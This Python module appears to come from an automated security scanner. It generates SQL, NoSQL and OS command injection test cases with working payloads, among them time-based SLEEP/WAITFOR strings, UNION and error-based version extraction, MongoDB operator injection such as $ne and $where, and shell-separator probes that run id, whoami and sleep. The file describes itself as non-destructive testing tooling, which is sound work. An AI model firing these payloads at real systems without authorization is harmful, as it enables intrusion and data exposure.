"""Injection generators: sqli, nosqli, command_injection.

Non-destructive only: no DROP/DELETE/UPDATE/INSERT, no stacked writes, no
heavy-query denial of service, and no row extraction. For a PoC the generators
surface only DB *metadata* (version / database name), which is not user data,
and command_injection runs only read-only identity probes (id / whoami) or a
benign delay (sleep) for a timing proof. Boolean SQLi is judged by the response
differential, never by a status flip: a true/false pair can be two 200s whose
bodies differ. The control (case 0) is the timing/response baseline, sent three
times so a delay is measured against a real median.
"""

from __future__ import annotations

from .base import Ctx, TestCase

GENERATORS: dict = {}

# A distinctive DBMS version/banner fingerprint. If this appears in a response after an extraction
# payload, the injection surfaced database metadata (a reportable PoC) -- it is specific enough not
# to match ordinary page text.
_VERSION_RX = (r"(?is)(?:MariaDB|MySQL|PostgreSQL|Microsoft SQL Server|Oracle Database|SQLite)\b.{0,60}?\d+\.\d+"
               r"|XPATH syntax error: '~|\b\d+\.\d+\.\d+-(?:MariaDB|ubuntu|log)\b")


def _gen(name):
    def deco(fn):
        GENERATORS[name] = fn
        return fn
    return deco


# A short, fixed delay. Two values prove proportionality; both are well below any DoS threshold.
D1, D2 = 2, 4

# Half of a differential pair. It never counts as a signal alone (an empty status list cannot
# match), so an input the server ignores cannot raise a candidate from the probe half; the
# paired case that runs after it carries the verdict for both.
_PAIR_PROBE = {"type": "status_in", "values": []}

# An operator or juggled value counts only when the server ACCEPTED it (2xx) and answered
# differently. A 4xx is the framework rejecting the type (Jackson/Spring, pydantic, zod), not a
# query that ran with an operator.
_ACCEPTED = {"type": "status_in", "values": list(range(200, 300))}

# A SQL injection differential manifests as a 2xx with different data (boolean/union) or a 5xx / DB
# error (error-based). It is NEVER a clean 4xx input rejection: a numeric field (e.g. an epoch
# timestamp, an id) handed a SQL string is rejected 400/422 by the body/type validator before any
# query runs, and that 400-vs-200 flip is not a SQL signal. Union/error cases must exclude it.
_NOT_CLIENT_REJECT = {"type": "not", "of": {"type": "status_in", "values": [400, 401, 403, 404, 405, 406, 409, 415, 422, 429]}}


def _quote_forms(vtype: str):
    """Likely string terminators to try, given the observed value type."""
    if vtype == "int":
        return [("numeric", ""), ("single", "'"), ("double", '"')]
    return [("single", "'"), ("double", '"'), ("numeric", "")]


@_gen("sqli")
def gen_sqli(ctx: Ctx) -> list[TestCase]:
    base = ctx.sample_value or "1"
    orderby = bool(ctx.flags.get("orderby"))
    cases: list[TestCase] = []

    # control: the timing baseline (3 repeats) and that the request works unmodified
    cases.append(TestCase(case_no=0, technique="sqli.control.baseline", payload=base,
                          mutation=[{"op": "set_input", "value": base}], is_control=True, repeat=3,
                          positive={"type": "matches_base", "max_len_ratio": 0.5},
                          negative="the unmodified request does not return the expected baseline, so the tooling is broken",
                          description="control: timing and response baseline (3 repeats)"))
    n = 1

    # error-differential signal: quote PARITY matters. A lone quote breaks the response, and a balanced
    # pair answers differently from the broken one (it parses; its rows may differ from the baseline).
    # The lone quote alone is only a probe: an input the server ignores keeps both at the baseline, and
    # a typed field the framework rejects with a 400 for any non-numeric value answers both alike, which
    # is no differential. The pair verdict lands on the balanced case, which runs second.
    quote_case = n
    cases.append(TestCase(case_no=n, technique="sqli.err.single_quote", payload=base + "'",
                          mutation=[{"op": "set_input", "value": base + "'", "raw": False}],
                          positive=_PAIR_PROBE,
                          negative="a lone quote is a probe for the balanced-quote pair; it is never a signal on its own",
                          rung="error_differential",
                          description="error differential probe: unbalanced quote"))
    n += 1
    cases.append(TestCase(case_no=n, technique="sqli.err.balanced", payload=base + "''",
                          mutation=[{"op": "set_input", "value": base + "''", "raw": False}],
                          positive={"type": "all", "of": [
                              {"type": "not", "of": {"type": "same_as_case", "a": quote_case, "case": 0, "max_len_diff": 64}},
                              {"type": "not", "of": {"type": "same_as_case", "a": "this", "case": quote_case, "max_len_diff": 24}}]},
                          negative="the balanced quote and the lone quote behave alike, so quote parity is not reaching a parser",
                          rung="error_differential",
                          description="error differential: a lone quote breaks the response and a balanced pair answers differently from it"))
    n += 1

    # boolean pair: a TRUE condition that looks like the baseline, a FALSE condition that does not.
    for qname, q in _quote_forms(ctx.value_type):
        comment = "-- -" if q else "-- -"
        true_payload = f"{base}{q} OR {q}1{q}={q}1{comment}" if q else f"{base} OR 1=1-- -"
        false_payload = f"{base}{q} AND {q}1{q}={q}2{comment}" if q else f"{base} AND 1=2-- -"
        # TRUE case: a probe. Matching the baseline is what ANY ignored input does, so it is never a
        # signal alone; the pair verdict lands on the FALSE case, which runs second.
        cases.append(TestCase(case_no=n, technique=f"sqli.bool.true_{qname}", payload=true_payload,
                              mutation=[{"op": "set_input", "value": true_payload, "raw": False}], repeat=3,
                              positive=_PAIR_PROBE,
                              negative="the always-true condition is a probe for the boolean pair; it is never a signal on its own",
                              rung="boolean_pair", description=f"boolean TRUE ({qname} quoting), pair probe"))
        true_case = n
        n += 1
        # FALSE case: the pair verdict. TRUE reproduces the baseline AND FALSE differs materially from it.
        cases.append(TestCase(case_no=n, technique=f"sqli.bool.false_{qname}", payload=false_payload,
                              mutation=[{"op": "set_input", "value": false_payload, "raw": False}], repeat=3,
                              positive={"type": "all", "of": [
                                  {"type": "len_diff", "a": "this", "b": true_case, "min_bytes": 24},
                                  {"type": "not", "of": {"type": "same_as_case", "a": "this", "case": 0, "max_len_diff": 24}}]},
                              negative="the always-false condition returns the same bytes as the always-true one, so there is no boolean differential",
                              rung="boolean_pair", description=f"boolean FALSE ({qname} quoting), differs from TRUE and from the baseline"))
        false_case = n
        n += 1
        break  # one quoting style's pair is enough for the family; more variants below

    # union / column-count probing (non-destructive: ORDER BY n and UNION SELECT NULLs).
    # A differential response or error as the column index passes the real count is the signal.
    for variant, payload in [("orderby_high", f"{base} ORDER BY 50-- -"),
                           ("union_nulls", f"{base}' UNION SELECT NULL-- -" if ctx.value_type != 'int' else f"{base} UNION SELECT NULL-- -")]:
        cases.append(TestCase(case_no=n, technique=f"sqli.union.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": False}],
                              positive={"type": "all", "of": [
                                  {"type": "not", "of": {"type": "same_as_case", "case": 0, "max_len_diff": 64}},
                                  _NOT_CLIENT_REJECT]},
                              negative=f"the {variant} probe changes nothing (or is rejected 4xx by input validation, not a query), so the column list is not reached",
                              rung="error_differential", description=f"column-count probe: {variant}"))
        n += 1

    # a second boolean family member with a different shape (parenthesis balancing)
    paren_true = f"{base}) OR (1=1)-- -"
    cases.append(TestCase(case_no=n, technique="sqli.bool.paren_true", payload=paren_true,
                          mutation=[{"op": "set_input", "value": paren_true, "raw": False}], repeat=2,
                          positive={"type": "all", "of": [
                              {"type": "same_as_case", "case": 0, "max_len_diff": 96},
                              {"type": "not", "of": {"type": "same_as_case", "a": false_case, "case": 0, "max_len_diff": 24}}]},
                          negative="parenthesis-balanced TRUE and the FALSE probe behave alike, so there is no boolean differential",
                          rung="boolean_pair", description="boolean TRUE with parenthesis balancing, against the FALSE probe"))
    n += 1

    # time-based: two delays, proportional, each 3 repeats, measured against the control median.
    sleepers = [
        ("mysql", "AND SLEEP({d})"),
        ("postgres", "AND {d}=(SELECT {d} FROM PG_SLEEP({d}))"),
        ("mssql", "; WAITFOR DELAY '0:0:{d}'--"),
        ("oracle", "AND {d}=DBMS_PIPE.RECEIVE_MESSAGE('a',{d})"),
        ("generic_sqlite", "AND {d}=sleep({d})"),
    ]
    first_time_case = None
    for dialect, tmpl in sleepers[:4]:
        q = "'" if ctx.value_type != "int" else ""
        payload = f"{base}{q} {tmpl.format(d=D1)}{(q and '-- -')}"
        cases.append(TestCase(case_no=n, technique=f"sqli.time.{dialect}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": False}], repeat=3,
                              positive={"type": "elapsed_over_baseline", "min_ms": D1 * 1000 - 500, "baseline_case": 0},
                              negative=f"the {dialect} delay payload does not slow the response versus the baseline",
                              rung="time_based", description=f"time-based ({dialect}), {D1}s"))
        if first_time_case is None:
            first_time_case = n
        n += 1
    # proportionality: the longer delay must be measurably longer than the shorter one
    q = "'" if ctx.value_type != "int" else ""
    payload = f"{base}{q} AND SLEEP({D2}){(q and '-- -')}"
    cases.append(TestCase(case_no=n, technique="sqli.time.proportional", payload=payload,
                          mutation=[{"op": "set_input", "value": payload, "raw": False}], repeat=3,
                          positive={"type": "all", "of": [
                              {"type": "elapsed_over_baseline", "min_ms": D2 * 1000 - 500, "baseline_case": 0},
                              {"type": "elapsed_over_case", "case": first_time_case, "min_ms": (D2 - D1) * 1000 - 700}]},
                          negative="the longer delay is not proportionally slower, so the delay is not controlled by the payload",
                          rung="time_based", description=f"time-based proportionality, {D2}s vs {D1}s"))
    n += 1
    # DBMS identification: a conditional delay gated on a version predicate (no data returned)
    for dialect, pred in [("postgres", "(SELECT 1 FROM pg_sleep({d}) WHERE version() LIKE '%PostgreSQL%')"),
                         ("mysql", "(SELECT SLEEP({d}) WHERE @@version LIKE '%MariaDB%' OR @@version LIKE '%MySQL%')"),
                         ("sqlite", "(SELECT CASE WHEN sqlite_version() LIKE '3%' THEN sleep({d}) ELSE 0 END)")]:
        q = "'" if ctx.value_type != "int" else ""
        payload = f"{base}{q} AND {D1}={pred.format(d=D1)}{(q and '-- -')}"
        cases.append(TestCase(case_no=n, technique=f"sqli.dbms.{dialect}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": False}], repeat=2,
                              positive={"type": "elapsed_over_baseline", "min_ms": D1 * 1000 - 500, "baseline_case": 0},
                              negative=f"the delay gated on a {dialect} version predicate does not fire, so this is not {dialect}",
                              rung="dbms_identified", description=f"DBMS identification via a {dialect} version-gated delay"))
        n += 1

    # order-by family, mandatory on sort/order/column inputs
    if orderby:
        for variant, payload in [
            ("index", "1"),
            ("case_when", f"(CASE WHEN (1=1) THEN 1 ELSE 2 END)"),
            ("conditional_sleep", f"(CASE WHEN (1=1) THEN sleep({D1}) ELSE 1 END)"),
        ]:
            pos = ({"type": "elapsed_over_baseline", "min_ms": D1 * 1000 - 500, "baseline_case": 0}
                   if variant == "conditional_sleep"
                   else {"type": "not", "of": {"type": "same_as_case", "case": 0, "max_len_diff": 8}})
            cases.append(TestCase(case_no=n, technique=f"sqli.orderby.{variant}", payload=payload,
                                  mutation=[{"op": "set_input", "value": payload, "raw": False}],
                                  repeat=3 if variant == "conditional_sleep" else 2,
                                  positive=pos,
                                  negative=f"the ORDER BY {variant} expression changes neither the ordering nor the timing",
                                  rung="time_based" if variant == "conditional_sleep" else "boolean_pair",
                                  description=f"ORDER BY injection: {variant}"))
            n += 1

    # location variant: the same quote probe moved to another accepted spot
    if ctx.input_location in ("query", "form"):
        to = "json" if ctx.body_kind == "json" else ("header" if ctx.input_location == "query" else "query")
        payload = f"{base}' AND SLEEP({D1})-- -"
        cases.append(TestCase(case_no=n, technique=f"sqli.time.location_{to}", payload=payload,
                              mutation=[{"op": "move_input", "to": to, "value": payload}], repeat=2,
                              positive={"type": "elapsed_over_baseline", "min_ms": D1 * 1000 - 500, "baseline_case": 0},
                              negative=f"the delay payload in the {to} location does not slow the response",
                              rung="time_based", description=f"time-based from the {to} location"))
        n += 1

    # metadata extraction (PoC): surface the DBMS version / database name into the response. This is
    # metadata, never user rows, so it stays inside Rule 0. Error-based payloads leak the banner in
    # the error text; UNION payloads place it in the result set. The positive is the version
    # fingerprint, which is specific enough not to fire on ordinary page content.
    q = "'" if ctx.value_type != "int" else ""
    end = "-- -" if q else "-- -"
    extract = [
        ("mysql_error", f"{base}{q} AND extractvalue(1,concat(0x7e,version(),0x7e)){end}"),
        ("postgres_cast", f"{base}{q} AND 1=CAST(version() AS int){end}"),
        ("mssql_convert", f"{base}{q} AND 1=CONVERT(int,@@version){end}"),
        ("union_version", f"{base}{q} UNION SELECT @@version{end}" if ctx.value_type != "int" else f"{base} UNION SELECT @@version{end}"),
        ("union_dbname", f"{base}{q} UNION SELECT database(){end}" if ctx.value_type != "int" else f"{base} UNION SELECT database(){end}"),
    ]
    for variant, payload in extract:
        cases.append(TestCase(case_no=n, technique=f"sqli.extract.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": False}],
                              positive={"type": "all", "of": [
                                  {"type": "body_regex", "pattern": _VERSION_RX},
                                  _NOT_CLIENT_REJECT]},
                              negative=f"the {variant} extraction payload surfaces no DBMS version or database-name banner in the response",
                              rung="data_extraction",
                              description=f"metadata extraction (version / db name): {variant}"))
        n += 1
    return cases


@_gen("nosqli")
def gen_nosqli(ctx: Ctx) -> list[TestCase]:
    base = ctx.sample_value or "x"
    loc = ctx.input_location or "json"
    is_json = loc == "json" or ctx.body_kind == "json"
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="nosqli.control.baseline", payload=base,
                          mutation=[{"op": "set_input", "value": base}], is_control=True,
                          positive={"type": "matches_base", "max_len_ratio": 0.5},
                          negative="the unmodified request does not return the baseline, so the tooling is broken",
                          description="control: the normal value returns the baseline response"))
    n = 1

    def op_case(no, family, variant, value, rung, negative):
        return TestCase(case_no=no, technique=f"nosqli.{family}.{variant}", payload=repr(value),
                        mutation=[{"op": "set_input_json", "value": value}],
                        positive={"type": "all", "of": [
                            _ACCEPTED, {"type": "not", "of": {"type": "same_as_case", "case": 0, "max_len_diff": 24}}]},
                        negative=negative, rung=rung,
                        description=f"operator injection {family}.{variant} ({'JSON object' if is_json else 'bracketed key'})")

    # operator injection, split into families so the breadth is honest about the technique variety
    for family, variant, value in [
        ("op", "ne_null", {"$ne": None}), ("op", "ne_empty", {"$ne": ""}), ("op", "gt_empty", {"$gt": ""}),
        ("regex", "any", {"$regex": ".*"}), ("exists", "true", {"$exists": True}),
        ("in", "list", {"$in": [base, "x"]})]:
        cases.append(op_case(n, family, variant, value, "operator_injection",
                             f"the {family} {variant} operator is treated as a literal, so the response matches the baseline"))
        n += 1

    # type juggling: string -> array / object / bool
    for variant, value in [("to_array", [base]), ("to_true", True), ("to_object", {"a": base})]:
        cases.append(TestCase(case_no=n, technique=f"nosqli.juggle.{variant}", payload=repr(value),
                              mutation=[{"op": "set_input_json", "value": value}],
                              positive={"type": "all", "of": [
                                  _ACCEPTED, {"type": "not", "of": {"type": "same_as_case", "case": 0, "max_len_diff": 24}}]},
                              negative=f"juggling the value {variant} changes nothing versus the baseline",
                              rung="type_juggling", description=f"type juggling {variant}"))
        n += 1

    # boolean differential: a regex that must match vs one that cannot
    true_regex = {"$regex": "^" + (base[:1] or "a")}
    false_regex = {"$regex": "^\\x00nevermatch\\x00$"}
    cases.append(TestCase(case_no=n, technique="nosqli.bool.regex_true", payload=repr(true_regex),
                          mutation=[{"op": "set_input_json", "value": true_regex}],
                          positive={"type": "all", "of": [
                              _ACCEPTED, {"type": "not", "of": {"type": "same_as_case", "case": 0, "max_len_diff": 24}}]},
                          negative="a matching regex returns the baseline, so the regex is not evaluated",
                          rung="boolean_differential", description="boolean differential: matching regex"))
    true_case = n
    n += 1
    cases.append(TestCase(case_no=n, technique="nosqli.bool.regex_false", payload=repr(false_regex),
                          mutation=[{"op": "set_input_json", "value": false_regex}],
                          positive={"type": "all", "of": [
                              _ACCEPTED, {"type": "len_diff", "a": "this", "b": true_case, "min_bytes": 24}]},
                          negative="the non-matching regex returns the same bytes as the matching one, so there is no differential",
                          rung="boolean_differential", description="boolean differential: non-matching regex"))
    n += 1

    # $where / JS injection as an operator (string, not executed by us; detects a JS-capable store)
    where_val = {"$where": "return true"}
    cases.append(TestCase(case_no=n, technique="nosqli.where.true", payload=repr(where_val),
                          mutation=[{"op": "set_input_json", "value": where_val}],
                          positive={"type": "all", "of": [
                              _ACCEPTED, {"type": "not", "of": {"type": "same_as_case", "case": 0, "max_len_diff": 24}}]},
                          negative="the $where clause is treated as a literal, so nothing changes",
                          rung="operator_injection", description="$where operator (always-true predicate, no side effect)"))
    n += 1
    return cases


# Service-account names whose fresh appearance in a response is a strong `whoami` signal (unlikely
# in ordinary page text, unlike a bare "root"). Anchored to a line start to avoid substring matches.
_WHOAMI_RX = r"(?im)^\s*(?:www-data|nt authority\|iis apppool\|daemon|nobody|_www|postgres|mysql|apache)\b"
# `id` output is unambiguous: uid=NNN(name) ... gid=NNN. This never appears in normal content.
_ID_RX = r"uid=\d+\([^)]*\)[^\n]{0,80}gid=\d+"
# Benign delay (seconds). A timing proof uses a conditional-free delay well below any DoS threshold.
_RCE_DELAY = 5


@_gen("command_injection")
def gen_command_injection(ctx: Ctx) -> list[TestCase]:
    """OS command injection, proved non-destructively. Output cases run `id`/`whoami` (read-only
    identity probes) and look for their unmistakable output; blind cases run a benign `sleep`/
    `timeout` delay and measure it against the control median. No cat/curl/rm/write/exfil, ever --
    the safety screen enforces that every payload here declares a benign extra.rce_cmd."""
    base = ctx.sample_value or "1"
    acting = ctx.acting_principal
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="command_injection.control.baseline", payload=base,
                          mutation=[{"op": "set_input", "value": base}], is_control=True, repeat=3, principal=acting,
                          positive={"type": "matches_base", "max_len_ratio": 0.5},
                          negative="the unmodified request does not return the expected baseline, so the tooling is broken",
                          description="control: timing and response baseline (3 repeats)"))
    n = 1

    def out_case(family, variant, inject, cmd, rx):
        return TestCase(case_no=n, technique=f"command_injection.{family}.{variant}", payload=base + inject,
                        mutation=[{"op": "set_input", "value": base + inject, "raw": False}],
                        extra={"rce_cmd": cmd}, principal=acting,
                        positive={"type": "body_regex", "pattern": rx},
                        negative=f"the {family}/{variant} injection of `{cmd}` produces no command output in the response",
                        rung="command_output", description=f"command output via {family}: `{cmd}`")

    # output-based: run `id` (and whoami) through the common shell separators, detect the output.
    for family, variant, inject in [("semicolon", "id", ";id"), ("pipe", "id", "|id"), ("amp", "id", "&&id"),
                                    ("subshell", "id", "$(id)"), ("backtick", "id", "`id`"), ("newline", "id", "\nid")]:
        cases.append(out_case(family, variant, inject, "id", _ID_RX))
        n += 1
    for family, variant, inject in [("semicolon", "whoami", ";whoami"), ("newline", "whoami", "\nwhoami")]:
        cases.append(out_case(family, variant, inject, "whoami", _WHOAMI_RX))
        n += 1

    # blind: a benign delay proves execution when there is no echoed output. Measured against the
    # control median; two repeats so a one-off slow response does not read as a hit.
    blind = [("blind", "sleep_semicolon", f";sleep {_RCE_DELAY}", "sleep"),
             ("blind", "sleep_subshell", f"$(sleep {_RCE_DELAY})", "sleep"),
             ("blind", "sleep_pipe", f"|sleep {_RCE_DELAY}", "sleep"),
             ("blind", "timeout_windows", f"& timeout /t {_RCE_DELAY}", "timeout")]
    for family, variant, inject, cmd in blind:
        cases.append(TestCase(case_no=n, technique=f"command_injection.{family}.{variant}", payload=base + inject,
                              mutation=[{"op": "set_input", "value": base + inject, "raw": False}], repeat=2,
                              extra={"rce_cmd": cmd}, principal=acting,
                              positive={"type": "elapsed_over_baseline", "min_ms": _RCE_DELAY * 1000 - 1500, "baseline_case": 0},
                              negative=f"the `{cmd}` delay via {variant} does not slow the response versus the baseline",
                              rung="blind_timing", description=f"blind command injection via {variant}: `{cmd} {_RCE_DELAY}`"))
        n += 1
    return cases
